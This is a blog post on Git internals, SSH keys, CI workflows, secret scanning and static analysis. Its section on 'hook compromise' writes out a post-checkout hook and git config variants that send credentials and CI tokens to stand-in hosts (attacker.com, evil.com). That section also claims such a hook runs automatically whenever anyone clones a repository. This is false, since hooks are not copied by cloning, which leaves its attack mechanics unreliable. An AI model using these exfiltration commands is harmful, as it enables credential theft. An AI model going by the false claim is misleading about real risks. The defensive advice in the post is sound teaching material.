---
title: Git Workflows for Secure Development
description: Understanding Git internals, authentication, and the algorithms behind security scanning.
date: 2025-11-20
categories:
  - DevOps
  - Security
  - Software Engineering
tags:
  - Git
  - GitHub Actions
  - CI/CD
  - DevSecOps
  - Cryptography
pin: false
math: true
---

# Introduction

When you `git commit`, what actually happens? When you `git push`, how does GitHub verify it's you? When CI scans your code, what algorithms does it use?

This post answers these questions by following code from your machine to production—understanding the internals at each step.

---

## 1. What Git Actually Stores

Git is often described as "version control," but that undersells it. Git is a **content-addressable filesystem**—a database where you retrieve data by its content, not its location.

### The Three Object Types

When you create a repository, Git stores everything as one of three object types:

**Blob** (Binary Large Object): The contents of a file. Just the content—no filename, no metadata.

**Tree**: A directory listing. Maps filenames to blobs (or other trees for subdirectories).

**Commit**: A snapshot. Points to a tree (the project state) plus metadata (author, date, message, parent commit).

Let's see this in action:

```bash
# Create a file
echo "Hello" > greeting.txt
git add greeting.txt

# Git created a blob - find it
git hash-object greeting.txt
# Output: ce013625030ba8dba906f756967f9e9ca394464a

# The blob is stored in .git/objects/ce/0136...
```

### Content Addressing

That hash `ce0136...` isn't random—it's the SHA-1 hash of the file contents:

```bash
echo -e "blob 6\0Hello" | sha1sum
# Same hash!
```

This is **content addressing**: the name of the object IS its content (hashed). Two files with identical content have identical hashes—Git stores them only once.

> Git stores what you committed, not what you intended. If two developers commit the same typo, Git sees one blob.
> {: .prompt-info }

---

## 2. How Git Ensures Integrity

Content addressing gives us something powerful: **tamper detection**.

### The Hash Function

Git uses SHA-1, which maps any input to a 160-bit digest:

$$H: \{0,1\}^* \rightarrow \{0,1\}^{160}$$

Key properties:

- **Deterministic**: Same input → same hash (always)
- **Avalanche**: Change 1 bit → ~50% of output bits change
- **One-way**: Given hash $h$, can't find input $m$ where $H(m) = h$

### Building a Merkle Tree

Here's the clever part. A commit doesn't just point to files—it points to a tree, which contains hashes of its children:

```
commit: a1b2c3...
  │
  ├─ tree: d4e5f6...
  │    ├─ blob: 111... (README.md)
  │    ├─ blob: 222... (main.py)
  │    └─ tree: 333... (src/)
  │         └─ blob: 444... (app.py)
  │
  └─ parent: 999...
```

The tree's hash includes its children's hashes:

$$H_{tree} = \text{SHA1}(\text{"tree"} \| H_{child_1} \| H_{child_2} \| \ldots)$$

**The consequence**: If you change `app.py`:

- Its blob hash changes (different content)
- The `src/` tree hash changes (different child)
- The root tree hash changes (different child)
- The commit hash changes (different tree)

One file change → all ancestors change. You can verify the entire repository by checking one hash.

### Why This Matters

Imagine someone tries to tamper with historical code—insert a backdoor in an old commit. They'd need to:

1. Change the blob
2. Recalculate every tree hash up to root
3. Recalculate every commit hash from that point forward

And everyone with a clone would see the mismatch. Git's integrity is structural, not optional.

> Git is migrating to SHA-256 due to theoretical SHA-1 weaknesses. The Merkle tree model stays the same.
> {: .prompt-info }

---

## 3. Authenticating with SSH

When you `git push`, GitHub needs to verify your identity. Password authentication is deprecated—SSH keys are the standard.

### The Problem

You need to prove you're you without sending your password over the network (it could be intercepted).

### The Solution: Asymmetric Cryptography

Generate a key pair:

```bash
ssh-keygen -t ed25519
```

This creates:

- **Private key** $d$: A random 256-bit number. Never leaves your machine.
- **Public key** $Q$: Derived from $d$. Safe to share—posted to GitHub.

The relationship: $Q = dG$, where $G$ is a known point on an elliptic curve.

### Why This Is Secure

The security relies on the **Elliptic Curve Discrete Logarithm Problem**:

Given $Q$ and $G$, finding $d$ requires approximately $2^{128}$ operations. That's:

- More than atoms in the observable universe
- Infeasible even with all computers on Earth

### The Authentication Dance

When you push:

1. GitHub sends a random challenge $r$
2. Your machine computes signature $\sigma = \text{Sign}(d, r)$
3. GitHub verifies: $\text{Verify}(Q, r, \sigma)$

If it passes, you must have $d$—but you never transmitted it.

| Algorithm | Key Size  | Security Basis              |
| --------- | --------- | --------------------------- |
| RSA-4096  | 4096 bits | Integer factorization       |
| Ed25519   | 256 bits  | Elliptic curve discrete log |

Ed25519 is faster and smaller with equivalent security.

---

## 4. Automating with GitHub Actions

When you push, GitHub can automatically run workflows—tests, builds, deployments.

### The Execution Model

A workflow is a YAML file in `.github/workflows/`:

```yaml
name: CI
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pytest
```

Think of it as: $\text{Event} \rightarrow \text{Jobs} \rightarrow \text{Steps}$

### Job Dependencies

Jobs can depend on each other, forming a graph:

```yaml
jobs:
  lint: # No dependencies
  test:
    needs: lint # Waits for lint
  security: # No dependencies (parallel with lint)
  deploy:
    needs: [test, security]
```

Execution order:

1. `lint` and `security` start together
2. `test` starts when `lint` finishes
3. `deploy` starts when both `test` and `security` finish

### Concurrency

```yaml
concurrency:
  group: deploy
  cancel-in-progress: true
```

Only one `deploy` runs at a time. New pushes cancel in-progress runs.

---

## 5. Detecting Secrets

Before code reaches production, we scan for accidentally committed credentials.

### The Problem

Developers sometimes commit API keys, passwords, or tokens. These end up in Git history forever (remember—Git stores everything).

### Approach 1: Pattern Matching

Known secrets have known formats:

| Service        | Pattern               |
| -------------- | --------------------- |
| GitHub Token   | `ghp_[a-zA-Z0-9]{36}` |
| AWS Access Key | `AKIA[0-9A-Z]{16}`    |

Regex finds these reliably.

### Approach 2: Entropy Analysis

Unknown secrets are random—and randomness has a signature.

**Shannon entropy** measures randomness. For a string with character frequencies $p_i$:

$$H = -\sum_{i} p_i \log_2 p_i$$

Examples:

- `password123` → $H \approx 2.8$ bits/char (low—repeated characters)
- `ghp_xK9mN2pL...` → $H \approx 4.5$ bits/char (high—random)

Detection rule: If $H > 4$ and length $> 20$, flag for review.

### False Positives

High entropy doesn't guarantee a secret—UUIDs and hashes are also random. Tools use context (variable names, file types) to reduce noise.

---

## 6. Static Analysis

SAST (Static Application Security Testing) finds vulnerabilities by analyzing source code without running it.

### The Idea: Taint Tracking

Define three categories:

- **Source**: Where untrusted data enters (user input, files)
- **Sink**: Where data does something dangerous (SQL query, shell command)
- **Sanitizer**: Function that makes data safe

Track each variable's "taint state":

$$
T(v) = \begin{cases}
\text{tainted} & \text{if } v \text{ comes from a source} \\
\text{tainted} & \text{if } v = f(u) \text{ and } u \text{ is tainted} \\
\text{clean} & \text{if } v \text{ passes through a sanitizer}
\end{cases}
$$

Alert when tainted data reaches a sink.

### Example

```python
def search(query):  # query is a SOURCE (user input)
    sql = f"SELECT * FROM items WHERE name = '{query}'"
    db.execute(sql)  # SINK!
```

The tool traces: `query` (tainted) → `sql` (still tainted) → `execute` (sink) → **SQL injection alert**.

### Limitations

SAST can't catch everything. Consider:

```python
if random() > 0.5:
    sanitize(data)
execute(data)  # Is this tainted?
```

Determining which path executes requires solving the halting problem—proven impossible. SAST is one layer, not a complete solution.

> SAST reduces risk but can't eliminate it. Always combine with other defenses.
> {: .prompt-warning }

---

## 7. Scanning Dependencies

Your code depends on libraries that depend on other libraries—a graph of trust.

```
your-app
├── fastapi
│   ├── starlette
│   └── pydantic
└── requests
    └── urllib3
```

### The Problem

Any package in this tree might have known vulnerabilities (CVEs). A bug in `urllib3` affects you even if you never import it directly.

### The Algorithm

For each $(package, version)$ in your dependency tree:

1. Query CVE databases (NVD, GitHub Advisory)
2. Check if your version is in the affected range

$$\text{vulnerable} \iff version \in [affected\_min, affected\_max)$$

### Severity Scoring

CVSS rates vulnerabilities 0-10:

| Score | Severity | Response |
| ----- | -------- | -------- |
| 0-3.9 | Low      | Monitor  |
| 4-6.9 | Medium   | Plan fix |
| 7-8.9 | High     | Fix soon |
| 9-10  | Critical | Fix now  |

---

## 8. The Attack: Hook Compromise

Now the critical part—how attackers exploit Git's automation.

### Git Hooks

Git runs scripts at certain events. These live in `.git/hooks/`:

| Hook            | When It Runs            |
| --------------- | ----------------------- |
| `pre-commit`    | Before creating commit  |
| `post-checkout` | After clone or checkout |
| `pre-push`      | Before pushing          |

Normally these enforce project standards (linting, tests). But they're just shell scripts...

### The Attack

**Step 1**: Attacker creates a malicious `post-checkout` hook:

```bash
#!/bin/bash
# This runs automatically when anyone clones

# Silently reconfigure Git to steal credentials
git config --global credential.helper '!f() {
    curl -s https://attacker.com/steal?creds=$1
}; f'

# If in CI, steal the token
if [ -n "$GITHUB_TOKEN" ]; then
    curl -s https://attacker.com/token?t=$GITHUB_TOKEN
fi
```

**Step 2**: Attacker publishes this in:

- A compromised popular repository
- A package with a Git submodule
- A "helpful" project template

**Step 3**: Victim clones:

```bash
git clone https://github.com/cool-project/template.git
# post-checkout runs automatically
# Victim's Git is now compromised
```

**Step 4**: The `--global` flag means this affects ALL future Git operations—every push to any repo leaks credentials.

### Why This Is Devastating

- **Persistent**: Survives after the malicious repo is deleted
- **Silent**: No output, victim doesn't know
- **Spreading**: CI runners may be shared between projects

> In 2022, researchers demonstrated this could compromise entire CI ecosystems through one popular package.
> {: .prompt-danger }

### Variants

**Credential helper hijack**:

```bash
git config --global credential.helper '!curl attacker.com?c=$@'
```

**MITM via proxy**:

```bash
git config --global http.proxy http://evil.com:8080
```

### Defense

Check before trusting:

```bash
git clone --no-checkout https://github.com/someone/repo.git
ls repo/.git/hooks/
```

Disable hooks:

```bash
git config --global core.hooksPath /dev/null
```

Detect compromise:

```bash
git config --global --list | grep -E "(credential|proxy)"
```

In CI, reset config:

```yaml
- name: Reset Git config
  run: |
    git config --global --unset-all credential.helper || true
    git config --global --unset http.proxy || true
```

---

## 9. Defense in Depth

No single tool catches everything. Layer your defenses:

| Layer            | What It Catches      |
| ---------------- | -------------------- |
| Pre-commit hooks | Secrets, formatting  |
| SAST             | Code vulnerabilities |
| Dependency scan  | Known CVEs           |
| Hook audit       | Supply chain attacks |

### The Math

With $n$ independent layers, each catching 90% of attacks (failure rate $p = 0.1$):

$$P(\text{breach}) = p^n = 0.1^n$$

- 1 layer: 10% get through
- 3 layers: 0.1% get through
- 5 layers: 0.001% get through

Even imperfect layers compound into strong protection.

---

## 10. Defense Patterns Across CI Platforms

Same defenses, different syntax:

| Defense             | GitHub Actions                | GitLab CI            | Jenkins           | Bitbucket        |
| ------------------- | ----------------------------- | -------------------- | ----------------- | ---------------- |
| **Secret Scan**     | `gitleaks/gitleaks-action@v2` | `secrets` analyzer   | `gitleaks detect` | `gitleaks` image |
| **Dependency Scan** | `aquasecurity/trivy-action`   | `gemnasium` analyzer | `trivy fs`        | `trivy` image    |
| **Config Reset**    | `run:` block                  | `before_script:`     | `sh` step         | `script:` block  |

### SAST Tools by Language

| Language           | Tool                          | Command                                   |
| ------------------ | ----------------------------- | ----------------------------------------- |
| **Python**         | Bandit                        | `bandit -r src/ -ll`                      |
| **JavaScript/TS**  | ESLint + security plugin      | `eslint --ext .js,.ts src/`               |
| **Java**           | SpotBugs + Find Security Bugs | `mvn spotbugs:check`                      |
| **Go**             | Gosec                         | `gosec ./...`                             |
| **Rust**           | cargo-audit                   | `cargo audit`                             |
| **Ruby**           | Brakeman                      | `brakeman -q`                             |
| **PHP**            | PHPStan + security rules      | `phpstan analyse src/`                    |
| **.NET**           | Security Code Scan            | `dotnet build /p:EnableNETAnalyzers=true` |
| **Multi-language** | Semgrep                       | `semgrep --config auto .`                 |

> **Semgrep** is recommended for polyglot codebases—one tool, consistent rules across all languages.
> {: .prompt-tip }

### Key Commands

**Secret scanning:**

```bash
gitleaks detect --source . --verbose
```

**Dependency scanning:**

```bash
trivy fs --severity HIGH,CRITICAL --exit-code 1 .
```

**SAST:**

```bash
bandit -r src/ -ll
```

**Git config reset** (critical for self-hosted runners):

```bash
git config --global --unset-all credential.helper || true
git config --global --unset http.proxy || true
```

> Self-hosted runners persist between jobs. Always reset Git config to prevent cross-job contamination from hook attacks.
> {: .prompt-warning }

---

## Key Takeaways

1. **Git objects**: Blobs, trees, commits—content-addressed by SHA hash
2. **Merkle trees**: One hash verifies entire history
3. **SSH auth**: Proves identity without transmitting secrets
4. **Secret detection**: Entropy > 4 bits/char suggests randomness
5. **Taint analysis**: Track untrusted data to dangerous operations
6. **Hook attacks**: Automation can be weaponized—audit what runs
7. **Layering**: $P(\text{breach}) = \prod p_i$—each layer multiplies protection

---

## References

1. [Git Internals - Git Objects](https://git-scm.com/book/en/v2/Git-Internals-Git-Objects)
2. [Ed25519: High-speed signatures](https://ed25519.cr.yp.to/)
3. [Shannon Entropy](<https://en.wikipedia.org/wiki/Entropy_(information_theory)>)
4. [CVSS v3.1 Specification](https://www.first.org/cvss/specification-document)
